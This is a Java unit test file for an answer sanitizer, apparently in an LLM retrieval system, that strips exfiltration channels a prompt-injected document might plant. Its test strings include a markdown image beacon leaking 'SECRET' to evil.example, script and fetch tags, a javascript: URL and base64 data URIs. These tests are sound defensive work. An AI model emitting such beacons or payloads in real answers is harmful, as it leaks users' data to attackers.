package dev.glassbox.generate;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

/** The exfiltration channels a prompt-injected document would try (SPEC 12). */
class AnswerSanitizerTest {
    final AnswerSanitizer sanitizer = new AnswerSanitizer();

    @Test
    void leavesPlainAnswersAndCitationsUntouched() {
        var r = sanitizer.sanitize("Pumps are inspected every 90 days [c1]. Cost is $5 (approx) [c2, c3].");
        assertThat(r.changed()).isFalse();
        assertThat(r.text()).isEqualTo("Pumps are inspected every 90 days [c1]. Cost is $5 (approx) [c2, c3].");
    }

    @Test
    void removesMarkdownImagesWhichAreTheClassicBeaconExfiltration() {
        var r = sanitizer.sanitize("Done ![x](https://evil.example/leak?d=SECRET) thanks");
        assertThat(r.text()).isEqualTo("Done  thanks");
        assertThat(r.changed()).isTrue();
    }

    @Test
    void keepsLinkTextButDropsTheTarget() {
        assertThat(sanitizer.sanitize("See [the policy](https://evil.example/p?x=1) [c1]").text()).isEqualTo("See the policy [c1]");
    }

    @Test
    void replacesBareUrls() {
        assertThat(sanitizer.sanitize("Visit https://evil.example/a?b=c now, or www.evil.example/x.").text())
                .isEqualTo("Visit [link removed] now, or [link removed].");
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "<img src=\"https://evil.example/x.png\">",
            "<a href=\"https://evil.example\">click</a>",
            "<script>fetch('https://evil.example')</script>",
            "javascript:alert(1)",
            "data:text/html;base64,PHNjcmlwdD4=",
            "![a](data:image/png;base64,AAAA)"})
    void neutralisesActiveContent(String payload) {
        String out = sanitizer.sanitize("text " + payload + " end").text();
        assertThat(out).doesNotContainIgnoringCase("evil.example").doesNotContain("<img").doesNotContain("<a ").doesNotContain("<script")
                .doesNotContain("javascript:").doesNotContain("data:text").doesNotContain("base64,AAAA");
    }
}
